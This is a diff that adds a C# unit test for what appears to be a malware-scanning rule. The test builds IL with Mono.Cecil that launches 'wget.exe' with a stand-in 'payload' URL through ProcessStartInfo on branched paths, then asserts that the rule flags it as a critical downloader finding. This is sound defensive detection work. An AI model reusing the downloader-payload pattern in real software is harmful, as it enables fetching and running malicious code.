@@ -633,6 +633,58 @@ public class ProcessStartRuleTests
     }
 
     [Fact]
+    public void GetFindingDescription_StaticStartInfoOverload_ResolvesEquivalentBranchedArguments()
+    {
+        using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
+        var method = new MethodDefinition("TestMethod", MethodAttributes.Public | MethodAttributes.Static,
+            module.TypeSystem.Void);
+        var type = new TypeDefinition("Tests", "TestType", TypeAttributes.Public);
+        module.Types.Add(type);
+        type.Methods.Add(method);
+
+        var process = new TypeReference("System.Diagnostics", "Process", module, module.TypeSystem.CoreLibrary);
+        var startInfo = new TypeReference("System.Diagnostics", "ProcessStartInfo", module,
+            module.TypeSystem.CoreLibrary);
+        var constructor = new MethodReference(".ctor", module.TypeSystem.Void, startInfo) { HasThis = true };
+        var setFileName = new MethodReference("set_FileName", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setFileName.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var setArguments = new MethodReference("set_Arguments", module.TypeSystem.Void, startInfo) { HasThis = true };
+        setArguments.Parameters.Add(new ParameterDefinition(module.TypeSystem.String));
+        var start = new MethodReference("Start", process, process) { HasThis = false };
+        start.Parameters.Add(new ParameterDefinition(startInfo));
+        var startInfoLocal = new VariableDefinition(startInfo);
+        method.Body.Variables.Add(startInfoLocal);
+
+        var processor = method.Body.GetILProcessor();
+        var elseBranch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        var launch = Instruction.Create(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Newobj, constructor);
+        processor.Emit(OpCodes.Dup);
+        processor.Emit(OpCodes.Ldstr, "wget.exe");
+        processor.Emit(OpCodes.Callvirt, setFileName);
+        processor.Emit(OpCodes.Stloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldc_I4_0);
+        processor.Emit(OpCodes.Brfalse, elseBranch);
+        processor.Emit(OpCodes.Ldloc, startInfoLocal);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Emit(OpCodes.Br, launch);
+        processor.Append(elseBranch);
+        processor.Emit(OpCodes.Ldstr, "https://example.invalid/payload");
+        processor.Emit(OpCodes.Callvirt, setArguments);
+        processor.Append(launch);
+        processor.Emit(OpCodes.Call, start);
+
+        string description = _rule.GetFindingDescription(method, start, method.Body.Instructions,
+            method.Body.Instructions.Count - 1);
+
+        description.Should().Contain("Target: \"wget.exe\"");
+        description.Should().Contain("Arguments: https://example.invalid/payload");
+        description.Should().Contain("Downloader executable with URL arguments");
+        _rule.Severity.Should().Be(Severity.Critical);
+    }
+
+    [Fact]
     public void GetFindingDescription_UnrelatedStartInfoConstructor_DoesNotSupplyArguments()
     {
         using var module = ModuleDefinition.CreateModule("TestAssembly", ModuleKind.Dll);
